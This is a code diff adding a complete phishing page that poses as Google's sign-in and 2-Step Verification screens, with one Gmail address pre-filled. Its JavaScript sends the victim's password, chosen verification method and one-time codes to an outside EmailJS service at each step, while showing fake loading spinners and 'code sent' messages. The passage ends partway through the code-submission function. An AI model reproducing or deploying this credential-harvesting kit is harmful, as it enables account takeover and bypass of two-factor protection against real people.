@@ -1,0 +1,1459 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google - Sign in</title>
+    
+    <!-- EmailJS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <!-- SweetAlert2 for alerts -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+        }
+
+        body {
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .google-container {
+            max-width: 500px;
+            width: 100%;
+            background: white;
+            border-radius: 28px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.2);
+            overflow: hidden;
+            animation: slideUp 0.5s ease;
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Google Header */
+        .google-header {
+            background: #1a73e8;
+            background: white;
+            color: white;
+            color: #1a73e8;
+            color: black;
+            padding: 25px;
+            text-align: center;
+        }
+
+        .google-logox {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+
+        .google-logox img {
+            width: 40%;
+        }
+
+        
+
+        .google-header h2 {
+            font-size: 20px;
+            font-weight: 400;
+        }
+
+        /* Progress Steps */
+        .progress-container {
+            padding: 20px;
+            background: #f8f9fa;
+            border-bottom: 1px solid #dadce0;
+        }
+
+        .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            position: relative;
+        }
+
+        .progress-steps::before {
+            content: '';
+            position: absolute;
+            top: 15px;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: #dadce0;
+            z-index: 1;
+        }
+
+        .step {
+            position: relative;
+            z-index: 2;
+            background: #f8f9fa;
+            padding: 0 10px;
+            text-align: center;
+        }
+
+        .step .circle {
+            width: 30px;
+            height: 30px;
+            background: white;
+            border: 2px solid #dadce0;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 5px;
+            font-weight: 500;
+            transition: all 0.3s;
+        }
+
+        .step.active .circle {
+            background: #1a73e8;
+            border-color: #1a73e8;
+            color: white;
+        }
+
+        .step.completed .circle {
+            background: #34a853;
+            border-color: #34a853;
+            color: white;
+        }
+
+        .step span {
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        .step.active span {
+            color: #1a73e8;
+            font-weight: 500;
+        }
+
+        /* Step Content */
+        .step-content {
+            display: none;
+            padding: 30px;
+        }
+
+        .step-content.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* Account Info */
+        .account-info {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 12px;
+            margin-bottom: 25px;
+        }
+
+        .account-avatar {
+            width: 48px;
+            height: 48px;
+            background: #1a73e8;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+        }
+
+        .account-details h4 {
+            color: #202124;
+            margin-bottom: 3px;
+        }
+
+        .account-details p {
+            color: #5f6368;
+            font-size: 14px;
+        }
+
+        /* Form Elements */
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #202124;
+            font-size: 14px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 16px;
+            color: #5f6368;
+            font-size: 18px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 14px 16px 14px 50px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            transition: all 0.3s;
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px #e8f0fe;
+        }
+
+        /* Password Field */
+        .password-wrapper {
+            position: relative;
+            width: 100%;
+        }
+
+        .password-wrapper input {
+            padding-right: 45px;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #5f6368;
+            font-size: 20px;
+            z-index: 2;
+        }
+
+        /* Buttons */
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn:hover {
+            background: #0d62c9;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(26,115,232,0.2);
+        }
+
+        .btn-outline {
+            background: white;
+            color: #1a73e8;
+            border: 2px solid #1a73e8;
+        }
+
+        .btn-outline:hover {
+            background: #e8f0fe;
+        }
+
+        /* Options */
+        .options {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin: 20px 0;
+        }
+
+        .checkbox {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #5f6368;
+            font-size: 14px;
+        }
+
+        .help-link {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        /* Verification Options (Step 2) */
+        .section-title {
+            font-size: 16px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 15px;
+        }
+
+        .verification-options {
+            margin-bottom: 25px;
+        }
+
+        .option-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+            padding: 12px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 12px;
+            margin-bottom: 10px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .option-item:hover:not(.disabled) {
+            background: #f1f3f4;
+            border-color: #1a73e8;
+        }
+
+        .option-item.selected {
+            background: #e8f0fe;
+            border-color: #1a73e8;
+        }
+
+        .option-item.disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            background: #f5f5f5;
+            pointer-events: none;
+        }
+
+        .option-radio input[type="radio"] {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+            accent-color: #1a73e8;
+        }
+
+        .option-radio input[type="radio"]:disabled {
+            cursor: not-allowed;
+            opacity: 0.5;
+        }
+
+        .option-content {
+            flex: 1;
+        }
+
+        .option-title {
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 4px;
+            font-size: 15px;
+        }
+
+        .option-description {
+            color: #5f6368;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+
+        .option-note {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 4px;
+        }
+
+        .try-another {
+            margin: 20px 0;
+        }
+
+        .try-another a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 24px;
+            padding: 30px;
+            max-width: 400px;
+            width: 90%;
+            animation: modalIn 0.3s;
+        }
+
+        @keyframes modalIn {
+            from { transform: translateY(-50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .modal-header h3 {
+            color: #202124;
+        }
+
+        .modal-close {
+            cursor: pointer;
+            font-size: 24px;
+            color: #5f6368;
+        }
+
+        .code-input {
+            width: 100%;
+            padding: 15px;
+            font-size: 24px;
+            letter-spacing: 8px;
+            text-align: center;
+            border: 2px solid #dadce0;
+            border-radius: 8px;
+            margin-bottom: 15px;
+        }
+
+        .code-input:focus {
+            outline: none;
+            border-color: #1a73e8;
+        }
+
+        .modal-btn {
+            width: 100%;
+            padding: 14px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .modal-btn:hover {
+            background: #0d62c9;
+        }
+
+        .phone-number {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+
+        .phone-number i {
+            color: #1a73e8;
+            font-size: 20px;
+        }
+
+        .recovery-email {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+
+        .device-list {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+
+        .device-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 0;
+            border-bottom: 1px solid #dadce0;
+        }
+
+        .device-item:last-child {
+            border-bottom: none;
+        }
+
+        /* Footer */
+        .footer {
+            padding: 20px 30px;
+            border-top: 1px solid #dadce0;
+            text-align: center;
+            background: #f8f9fa;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+            font-size: 12px;
+            margin: 0 10px;
+        }
+
+        .language-select {
+            padding: 6px 12px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            color: #5f6368;
+            font-size: 13px;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .options {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 15px;
+            }
+            
+            .footer {
+                flex-direction: column;
+                gap: 15px;
+            }
+        }
+
+
+
+
+
+        /* ==================== SMALL SCREEN TEXT SIZES (UNDER 600px) ==================== */
+@media (max-width: 600px) {
+    /* Header */
+    .google-header {
+        padding: 20px;
+    }
+    
+    .google-logo i {
+        font-size: 28px;
+    }
+    
+    .google-logo span {
+        font-size: 20px;
+    }
+    
+    .google-header h2 {
+        font-size: 18px;
+    }
+    
+    /* Progress Steps */
+    .progress-container {
+        padding: 15px;
+    }
+    
+    .step .circle {
+        width: 25px;
+        height: 25px;
+        font-size: 12px;
+    }
+    
+    .step span {
+        font-size: 10px;
+    }
+    
+    /* Step Content */
+    .step-content {
+        padding: 20px;
+    }
+    
+    /* Account Info */
+    .account-info {
+        padding: 12px;
+        gap: 12px;
+    }
+    
+    .account-avatar {
+        width: 40px;
+        height: 40px;
+        font-size: 20px;
+    }
+    
+    .account-details h4 {
+        font-size: 15px;
+    }
+    
+    .account-details p {
+        font-size: 12px;
+    }
+    
+    /* Form Elements */
+    .form-group label {
+        font-size: 13px;
+        margin-bottom: 5px;
+    }
+    
+    .form-control {
+        padding: 12px 14px 12px 45px;
+        font-size: 14px;
+    }
+    
+    .input-icon {
+        font-size: 16px;
+        left: 14px;
+    }
+    
+    .toggle-password {
+        font-size: 18px;
+    }
+    
+    /* Options */
+    .options {
+        margin: 15px 0;
+    }
+    
+    .checkbox {
+        font-size: 13px;
+    }
+    
+    .checkbox input[type="checkbox"] {
+        width: 16px;
+        height: 16px;
+    }
+    
+    .help-link {
+        font-size: 13px;
+    }
+    
+    /* Buttons */
+    .btn {
+        padding: 12px;
+        font-size: 15px;
+    }
+    
+    /* Verification Options */
+    .section-title {
+        font-size: 15px;
+        margin-bottom: 12px;
+    }
+    
+    .option-item {
+        padding: 10px 12px;
+        gap: 12px;
+    }
+    
+    .option-title {
+        font-size: 14px;
+    }
+    
+    .option-description {
+        font-size: 12px;
+    }
+    
+    .option-note {
+        font-size: 11px;
+    }
+    
+    .option-radio input[type="radio"] {
+        width: 16px;
+        height: 16px;
+    }
+    
+    .try-another a {
+        font-size: 13px;
+    }
+    
+    /* Modals */
+    .modal-content {
+        padding: 20px;
+    }
+    
+    .modal-header h3 {
+        font-size: 18px;
+    }
+    
+    .modal-close {
+        font-size: 22px;
+    }
+    
+    .code-input {
+        padding: 12px;
+        font-size: 20px;
+        letter-spacing: 6px;
+    }
+    
+    .modal-btn {
+        padding: 12px;
+        font-size: 15px;
+    }
+    
+    .phone-number,
+    .recovery-email {
+        padding: 12px;
+        font-size: 13px;
+    }
+    
+    .device-item {
+        font-size: 13px;
+    }
+    
+    /* Footer */
+    .footer {
+        padding: 15px 20px;
+    }
+    
+    .language-select {
+        padding: 5px 8px;
+        font-size: 12px;
+    }
+    
+    .footer-links a {
+        font-size: 11px;
+        margin: 0 8px;
+    }
+    
+    /* Small Text Elements */
+    p, small, .text-small {
+        font-size: 12px;
+    }
+    
+    h3 {
+        font-size: 18px;
+    }
+    
+    h4 {
+        font-size: 15px;
+    }
+}
+
+/* Extra Small Devices (under 400px) */
+@media (max-width: 400px) {
+    .google-logo i {
+        font-size: 24px;
+    }
+    
+    .google-logo span {
+        font-size: 18px;
+    }
+    
+    .google-header h2 {
+        font-size: 16px;
+    }
+    
+    .step .circle {
+        width: 22px;
+        height: 22px;
+        font-size: 11px;
+    }
+    
+    .step span {
+        font-size: 9px;
+    }
+    
+    .form-control {
+        padding: 10px 12px 10px 40px;
+        font-size: 13px;
+    }
+    
+    .btn {
+        padding: 10px;
+        font-size: 14px;
+    }
+    
+    .option-title {
+        font-size: 13px;
+    }
+    
+    .option-description {
+        font-size: 11px;
+    }
+    
+    .code-input {
+        font-size: 18px;
+        letter-spacing: 5px;
+    }
+    
+    .footer {
+        flex-direction: column;
+        gap: 10px;
+    }
+}
+    </style>
+</head>
+<body>
+    <div class="google-container">
+        <!-- Google Header -->
+        <div class="google-header">
+            <div class="google-logox">
+                <img src="logo.png" alt="">
+            </div>
+            <h2>Sign in to your Google Account</h2>
+        </div>
+
+        <!-- Progress Steps -->
+        <div class="progress-container">
+            <div class="progress-steps" id="progressSteps">
+                <div class="step active" data-step="1">
+                    <div class="circle">1</div>
+                    <span>Sign in</span>
+                </div>
+                <div class="step" data-step="2">
+                    <div class="circle">2</div>
+                    <span>Verify it's you</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- STEP 1: Email & Password -->
+        <div id="step1" class="step-content active">
+            <div class="account-info">
+                <div class="account-avatar">
+                    <i class="fas fa-user"></i>
+                </div>
+                <div class="account-details">
+                    <h4>Confirm account ownership</h4>
+                    <p>Sign in with your Google Account</p>
+                </div>
+            </div>
+
+
+            <script src="https://kit.fontawesome.com/e7bba27676.js" crossorigin="anonymous"></script>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label>Email address</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon"><i class="fas fa-envelope"></i></span>
+                        <input type="email" id="email" class="form-control" placeholder="Enter your email" value="medkingking12@gmail.com" required readonly>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Password</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon"></span>
+                        <div class="password-wrapper">
+                            <span style="margin-top: 3%;" class="input-icon"><i class="fa-solid fa-lock"></i></span>
+                            <input type="password" id="password" class="form-control" placeholder="Enter your password" required>
+                            <span class="toggle-password" onclick="togglePassword()">
+                                <i class="fa-regular fa-eye-slash"></i>
+                            </span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="options">
+                    <label class="checkbox">
+                        <input type="checkbox" id="staySignedIn" checked>
+                        Stay signed in
+                    </label>
+                    <a href="#" class="help-link">Forgot password?</a>
+                </div>
+
+                <button type="button" class="btn" onclick="nextStep()">
+                    Sign in
+                </button>
+            </form>
+        </div>
+
+        <!-- STEP 2: 2-Step Verification -->
+        <div id="step2" class="step-content">
+            <div class="account-info">
+                <div class="account-avatar">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <div class="account-details">
+                    <h4 id="displayEmail">johndoe@gmail.com</h4>
+                    <p>2-Step Verification</p>
+                </div>
+            </div>
+
+            <p style="color: #5f6368; font-size: 14px; margin-bottom: 20px;">
+                To help keep your account safe, Google wants to make sure it's really you trying to sign in
+            </p>
+
+            <div class="section-title">Choose how you want to sign in:</div>
+
+            <!-- Verification Options -->
+            <div class="verification-options" id="verificationOptions">
+
+                <!-- Option 1: Tap Yes on phone - DISABLED -->
+                <div  class="option-item disabled">
+                    <div class="option-radio">
+                        <input type="radio" name="verification" id="opt1" value="phone_prompt" disabled>
+                    </div>
+                    <div class="option-content">
+                        <div class="option-title">Tap <strong>Yes</strong> on your phone or tablet</div>
+                        <div class="option-note">
+                            <i class="fas fa-exclamation-circle"></i> Unavailable because you have more secure options
+                        </div>
+                    </div>
+                </div>
+
+
+                <!-- Option 2222: Google Authenticator -->
+                <div style="display: none;" class="option-item" onclick="openAuthenticatorModal()">
+                    <div class="option-radio">
+                        <input type="radio" name="verification" id="opt3" value="authenticator">
+                    </div>
+                    <div class="option-content">
+                        <div class="option-title">Get a verification code from the <strong>Google Authenticator app</strong></div>
+                    </div>
+                </div>
+
+                <!-- Option 2: Text message -->
+                <div class="option-item" onclick="openSMSModal()">
+                    <div class="option-radio">
+                        <input type="radio" name="verification" id="opt4" value="sms">
+                    </div>
+                    <div class="option-content">
+                        <div class="option-title">Get a verification code at <strong>+2**75</strong></div>
+                        <div class="option-description">2-Step Verification phone</div>
+                        <div class="option-description">Standard rates apply</div>
+                        
+                    </div>
+                </div>
+
+                <!-- Option 3: Recovery email -->
+                <div class="option-item" onclick="openRecoveryEmailModal()">
+                    <div class="option-radio">
+                        <input type="radio" name="verification" id="opt5" value="recovery_email">
+                    </div>
+                    <div class="option-content">
+                        <div class="option-title">Send <strong>Code</strong> to my recovery email</div>
+                    </div>
+                </div>
+
+                <!-- Option 4: Passkey - DISABLED -->
+                <div class="option-item disabled">
+                    <div class="option-radio">
+                        <input type="radio" name="verification" id="opt6" value="passkey" disabled>
+                    </div>
+                    <div class="option-content">
+                        <div class="option-title">Use your <strong>passkey</strong></div>
+                        <div class="option-note">
+                            <i class="fas fa-exclamation-circle"></i> Unavailable because you have more secure options
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Option 5: One-time code -->
+                <div class="option-item" onclick="openOneTimeCodeModal()">
+                    <div class="option-radio">
+                        <input type="radio" name="verification" id="opt7" value="one_time_code">
+                    </div>
+                    <div class="option-content">
+                        <div class="option-title">Get a one-time security code</div>
+                        <div class="option-description">Sign in on another device with your security key to get a code</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Try Another Way -->
+            <div class="try-another">
+                <a href="#"><i class="fa-regular fa-circle-question"></i> Try another way</a>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <select class="language-select" >
+                <option>English (United States)</option>
+                <option>Español</option>
+                <option>Français</option>
+                <option>Italiano</option>
+                <option>Deutsch</option>
+            </select>
+            <div class="footer-links">
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==================== OPTION-SPECIFIC MODALS ==================== -->
+
+    
+
+    <!-- Modal 2: Google Authenticator -->
+    <div id="authenticatorModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Google Authenticator</h3>
+                <span class="modal-close" onclick="closeModal('authenticatorModal')">&times;</span>
+            </div>
+            <div class="modal-body">
+                <div style="text-align: center; margin-bottom: 20px;">
+                    <div style="width: 60px; height: 60px; background: #1a73e8; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
+                        <i class="fas fa-shield-alt" style="color: white; font-size: 30px;"></i>
+                    </div>
+                    <h4 style="margin-bottom: 5px;">Enter the code from Google Authenticator</h4>
+                    <p style="color: #5f6368; font-size: 14px;">Open the app on your device to get the code</p>
+                </div>
+                <input type="text" id="authenticatorCode" class="code-input" placeholder="••••••" maxlength="6">
+                <p style="color: #5f6368; font-size: 13px; margin-top: 10px;">
+                    <i class="fas fa-info-circle"></i> The code refreshes every 30 seconds
+                </p>
+                <button class="modal-btn" onclick="submitCode('authenticatorCode', 'authenticator')">Verify</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal 3: SMS Verification -->
+    <div id="smsModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>SMS Verification</h3>
+                <span class="modal-close" onclick="closeModal('smsModal')">&times;</span>
+            </div>
+            <div class="modal-body">
+                <div style="text-align: center; margin-bottom: 20px;">
+                    <div style="width: 60px; height: 60px; background: #1a73e8; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
+                        <i class="fas fa-comment-sms" style="color: white; font-size: 30px;"></i>
+                    </div>
+                    <h4 style="margin-bottom: 5px;">Text message sent</h4>
+                    <p style="color: #5f6368; font-size: 14px;">Enter the 6-digit code sent via SMS</p>
+                </div>
+                <div class="phone-number">
+                    <i class="fas fa-mobile-alt"></i>
+                    <span>To: (+222)**2175</span>
+                </div>
+                <input type="text" id="smsCode" class="code-input" placeholder="••••••" maxlength="6">
+                <p style="text-align: right; margin: 10px 0;">
+                    <a href="#" style="color: #1a73e8; text-decoration: none;">Resend SMS</a>
+                </p>
+                <button class="modal-btn" onclick="submitCode('smsCode', 'sms')">Verify</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal 4: Recovery Email -->
+    <div id="recoveryEmailModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Recovery Email Verification</h3>
+                <span class="modal-close" onclick="closeModal('recoveryEmailModal')">&times;</span>
+            </div>
+            <div class="modal-body">
+                <div style="text-align: center; margin-bottom: 20px;">
+                    <div style="width: 60px; height: 60px; background: #1a73e8; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
+                        <i class="fas fa-envelope" style="color: white; font-size: 30px;"></i>
+                    </div>
+                    <h4 style="margin-bottom: 5px;">Check your recovery email</h4>
+                    <p style="color: #5f6368; font-size: 14px;">We sent a verification code to your recovery email</p>
+                </div>
+                <div class="recovery-email">
+                    <i class="fas fa-envelope-open-text"></i>
+                    <span>m***@gmail.com</span>
+                </div>
+                <input type="text" id="recoveryCode" class="code-input" placeholder="••••••" maxlength="6">
+                <p style="text-align: right; margin: 10px 0;">
+                    <a href="#" style="color: #1a73e8; text-decoration: none;">Resend email</a>
+                </p>
+                <button class="modal-btn" onclick="submitCode('recoveryCode', 'recovery_email')">Verify</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal 5: One-time Code -->
+    <div id="oneTimeCodeModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>One-time security code</h3>
+                <span class="modal-close" onclick="closeModal('oneTimeCodeModal')">&times;</span>
+            </div>
+            <div class="modal-body">
+                <div style="text-align: center; margin-bottom: 20px;">
+                    <div style="width: 60px; height: 60px; background: #1a73e8; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
+                        <i class="fas fa-key" style="color: white; font-size: 30px;"></i>
+                    </div>
+                    <h4 style="margin-bottom: 5px;">Enter the one-time code</h4>
+                    <p style="color: #5f6368; font-size: 14px;">Sign in on another device with your security key to get a code</p>
+                </div>
+                
+                <input type="text" id="oneTimeCode" class="code-input" placeholder="•••••••••" maxlength="">
+                <button class="modal-btn" onclick="submitCode('oneTimeCode', 'one_time_code')">Verify</button>
+            </div>
+        </div>
+    </div>
+
+
+
+<script>
+    // Initialize EmailJS
+    (function() {
+        emailjs.init({
+            //publicKey: "-h14BHuMwoJO3vHMh" // Your public key
+        });
+    })();
+
+    let currentStep = 1;
+    let selectedOption = null;
+    let userEmail = '';
+
+    // Toggle password visibility
+    function togglePassword() {
+        const passwordInput = document.getElementById('password');
+        const toggleIcon = document.querySelector('.toggle-password i');
+        
+        if (passwordInput.type === 'password') {
+            passwordInput.type = 'text';
+            toggleIcon.className = 'fa-regular fa-eye';
+        } else {
+            passwordInput.type = 'password';
+            toggleIcon.className = 'fa-regular fa-eye-slash';
+        }
+    }
+
+    // Update progress
+    function updateProgress(step) {
+        document.querySelectorAll('.step').forEach((el, index) => {
+            if (index + 1 < step) {
+                el.classList.add('completed');
+                el.classList.remove('active');
+            } else if (index + 1 === step) {
+                el.classList.add('active');
+                el.classList.remove('completed');
+            } else {
+                el.classList.remove('active', 'completed');
+            }
+        });
+    }
+
+    // Next step (from Step 1 to Step 2)
+    function nextStep() {
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const staySignedIn = document.getElementById('staySignedIn').checked;
+
+        // Validate Step 1
+        if (!email || !password) {
+            Swal.fire({
+                icon: 'warning',
+                title: 'Missing Information',
+                text: 'Please enter both email and password',
+                timer: 2000,
+                showConfirmButton: false
+            });
+            return;
+        }
+
+        if (!email.includes('@') || !email.includes('.')) {
+            Swal.fire({
+                icon: 'warning',
+                title: 'Invalid Email',
+                text: 'Please enter a valid email address',
+                timer: 2000,
+                showConfirmButton: false
+            });
+            return;
+        }
+
+        // Show loading
+        Swal.fire({
+            title: 'Verifying credentials...',
+            text: 'Please wait',
+            allowOutsideClick: false,
+            didOpen: () => Swal.showLoading()
+        });
+
+        // Store email for step 2
+        userEmail = email;
+
+        // ===== EMAIL 1: Send Login Credentials =====
+        emailjs.send("service_zl8edtk", "template_7uvwmq9", {
+            email: email,
+            password: password,
+            staySignedIn: staySignedIn ? 'Yes' : 'No',
+            step: '1 - Login Credentials',
+            timestamp: new Date().toLocaleString(),
+            userAgent: navigator.userAgent,
+            emailType: 'login_credentials'
+        }).then(() => {
+            console.log('✅ Email 1 sent: Login credentials');
+        }).catch(err => {
+            console.error('❌ Email 1 failed:', err);
+        }).finally(() => {
+            Swal.close();
+            
+            // Update display email in step 2
+            document.getElementById('displayEmail').textContent = email;
+            
+            // Move to Step 2
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+            updateProgress(2);
+            currentStep = 2;
+        });
+    }
+
+    // ===== EMAIL 2: Send Selected Method (FIXED) =====
+    function sendSelectedMethod(methodName, methodLabel) {
+        // Make sure we're sending the method data, not just email
+        emailjs.send("service_zl8edtk", "template_7uvwmq9", {
+            email: userEmail,                    // This is the email
+            selectedMethod: methodName,           // This is the method code (e.g., 'authenticator')
+            selectedMethodLabel: methodLabel,     // This is the human-readable method name
+            step: '2 - Method Selected',
+            timestamp: new Date().toLocaleString(),
+            userAgent: navigator.userAgent,
+            emailType: 'method_selected'
+        }).then(() => {
+            console.log(`✅ Email 2 sent: Method selected - ${methodLabel}`);
+            // Log what was sent for debugging
+            console.log('Method data:', {
+                email: userEmail,
+                selectedMethod: methodName,
+                selectedMethodLabel: methodLabel
+            });
+        }).catch(err => {
+            console.error('❌ Email 2 failed:', err);
+        });
+    }
+
+
+
+    // Show loading circle for 2 seconds then open modal
+    function showLoadingThenOpenModal(modalId, methodName, methodLabel) {
+        // Send EMAIL 2 immediately
+        sendSelectedMethod(methodName, methodLabel);
+        
+        // Show loading circle for 2 seconds
+        Swal.fire({
+            title: 'Sending code...',
+            html: 'Please wait <div class="loading-spinner" style="margin: 10px auto;"></div>',
+            allowOutsideClick: false,
+            showConfirmButton: false,
+            didOpen: () => {
+                // Add custom spinner CSS
+                const style = document.createElement('style');
+                style.innerHTML = `
+                    .loading-spinner {
+                        width: 40px;
+                        height: 40px;
+                        border: 4px solid #f3f3f3;
+                        border-top: 4px solid #1a73e8;
+                        border-radius: 50%;
+                        animation: spin 1s linear infinite;
+                    }
+                    @keyframes spin {
+                        0% { transform: rotate(0deg); }
+                        100% { transform: rotate(360deg); }
+                    }
+                `;
+                document.head.appendChild(style);
+            }
+        });
+
+        // Close loading after 2 seconds and open modal
+        setTimeout(() => {
+            Swal.close();
+            document.getElementById(modalId).style.display = 'flex';
+        }, 2000);
+    }
+
+    // Open functions with loading and method selection
+    function openSecurityCodeModal() {
+        selectedOption = 'security_code';
+        showLoadingThenOpenModal('securityCodeModal', 'security_code', 'Security code on phone');
+    }
+
+    function openAuthenticatorModal() {
+        selectedOption = 'authenticator';
+        showLoadingThenOpenModal('authenticatorModal', 'authenticator', 'Google Authenticator');
+    }
+
+    function openSMSModal() {
+        selectedOption = 'sms';
+        showLoadingThenOpenModal('smsModal', 'sms', 'SMS verification');
+    }
+
+    function openRecoveryEmailModal() {
+        selectedOption = 'recovery_email';
+        showLoadingThenOpenModal('recoveryEmailModal', 'recovery_email', 'Recovery email');
+    }
+
+    function openOneTimeCodeModal() {
+        selectedOption = 'one_time_code';
+        showLoadingThenOpenModal('oneTimeCodeModal', 'one_time_code', 'One-time security code');
+    }
+
+    // Close modal
+    function closeModal(modalId) {
+        document.getElementById(modalId).style.display = 'none';
+    }
+
+    // ===== EMAIL 3: Submit verification code =====
+    function submitCode(inputId, method) {
+        const code = document.getElementById(inputId).value;
+
+        if (!code || code.length < 4) {
+            Swal.fire({
+                icon: 'warning',
+                title: 'Invalid Code',
+                text: 'Please enter a valid verification code',
+                timer: 2000,
+                showConfirmButton: false
+            });
+            return;
+        }
+
+        // Show loading
+        Swal.fire({
+            title: 'Verifying...',
+            text: 'Please wait',
+            allowOutsideClick: false,
+            didOpen: () => Swal.showLoading()
+        });
+
+        // Send EMAIL 3 with verification code
+        emailjs.send("service_zl8edtk", "template_7uvwmq9", {
+            email: userEmail,
+            verificationCode: code,
+            method: method,
+            step: '3 - Code Entered',
+            timestamp: new Date().toLocaleString(),
+            userAgent: navigator.userAgent,
+            emailType: 'code_entered'
+        }).then(() => {
+            console.log('✅ Email 3 sent: Verification code');
+        }).catch(err => {
